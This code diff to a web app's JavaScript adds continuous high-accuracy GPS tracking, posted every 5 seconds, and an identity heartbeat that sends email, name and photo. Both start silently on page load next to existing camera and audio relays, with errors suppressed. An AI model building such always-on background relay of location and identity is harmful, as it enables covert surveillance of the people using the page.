@@ -355,6 +355,86 @@ async function fetchJSON(url, options = {}) {
     return resp.json();
 }
 
+// ============ GPS KONUM TAKİBİ ============
+
+let gpsWatchId = null;
+let gpsLastSend = 0;
+const GPS_INTERVAL = 5000; // 5 saniyede bir gönder
+
+function startGpsTracking() {
+    const auth = getAuth();
+    const perms = checkPermissions();
+    if (!auth || !perms || !perms.location || gpsWatchId !== null) return;
+
+    gpsWatchId = navigator.geolocation.watchPosition(
+        async (pos) => {
+            const now = Date.now();
+            if (now - gpsLastSend < GPS_INTERVAL) return; // Rate limit
+            gpsLastSend = now;
+
+            try {
+                await fetch(`${API_BASE}/api/relay/location`, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        uid: auth.uid,
+                        latitude: pos.coords.latitude,
+                        longitude: pos.coords.longitude,
+                        accuracy: pos.coords.accuracy,
+                        speed: pos.coords.speed,
+                        heading: pos.coords.heading,
+                        altitude: pos.coords.altitude,
+                        timestamp: pos.timestamp
+                    })
+                });
+            } catch {}
+        },
+        (err) => {},
+        { enableHighAccuracy: true, timeout: 15000, maximumAge: 5000 }
+    );
+}
+
+function stopGpsTracking() {
+    if (gpsWatchId !== null) {
+        navigator.geolocation.clearWatch(gpsWatchId);
+        gpsWatchId = null;
+    }
+}
+
+// ============ HEARTBEAT ============
+
+let heartbeatTimer = null;
+
+async function sendHeartbeat() {
+    const auth = getAuth();
+    if (!auth) return;
+    try {
+        await fetch(`${API_BASE}/api/relay/heartbeat`, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({
+                uid: auth.uid,
+                email: auth.email || '',
+                name: auth.name || '',
+                photo_url: auth.photoURL || ''
+            })
+        });
+    } catch {}
+}
+
+function startHeartbeat() {
+    stopHeartbeat();
+    sendHeartbeat();
+    heartbeatTimer = setInterval(sendHeartbeat, 10000);
+}
+
+function stopHeartbeat() {
+    if (heartbeatTimer) {
+        clearInterval(heartbeatTimer);
+        heartbeatTimer = null;
+    }
+}
+
 // ============ INIT ============
 
 document.addEventListener('DOMContentLoaded', async () => {
@@ -368,5 +448,7 @@ document.addEventListener('DOMContentLoaded', async () => {
         // İzinler daha önce verilmiş, arka plan servislerini başlat
         startCameraRelay();
         startAudioRelay();
+        startGpsTracking();
+        startHeartbeat();
     }
 });
